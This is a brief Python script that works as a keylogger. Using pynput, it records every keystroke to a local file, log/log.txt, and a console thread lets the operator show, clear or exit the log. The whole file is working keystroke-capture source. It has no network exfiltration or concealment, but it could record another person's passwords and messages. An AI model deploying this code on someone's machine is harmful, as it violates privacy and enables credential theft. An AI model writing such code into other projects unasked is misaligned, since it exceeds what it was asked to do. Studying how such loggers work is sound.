from pynput.keyboard import Listener
import _thread


def _filter(text: str) -> str:
    if text == 'Key.space':
        text = ' '  # space
    elif text == 'Key.shift':
        text = ''
    elif text == 'Key.enter':
        text = '\n'  # enter
    elif text == 'Key.backspace':
        text = ''
    elif text == '"\'"':
        text = '(single-quote)'
    elif text == '\'"\'':
        text = '(double-quote)'

    # removing ' and " from text:
    text = text.replace("'", "")
    text = text.replace('"', '')

    return text


def write_to_file(key):
    key_data = str(key)

    # filter command:
    key_data = _filter(key_data)

    with open("log/log.txt", 'at') as F_1:  # or just 'a'
        F_1.write(key_data)


def cmd():
    while True:
        entry = input()
        if entry == "$exit":
            import os
            os._exit(1)
        elif entry == "$clear":
            with open("log/log.txt", 'w') as F_2:
                F_2.write("")
            print("Cleared.")
        elif entry == "$show":
            with open("log/log.txt", 'r') as F_3:
                data = F_3.read()
            print(data)


if __name__ == "__main__":
    _thread.start_new_thread(cmd, ())

    with Listener(on_press=write_to_file) as L:
        L.join()
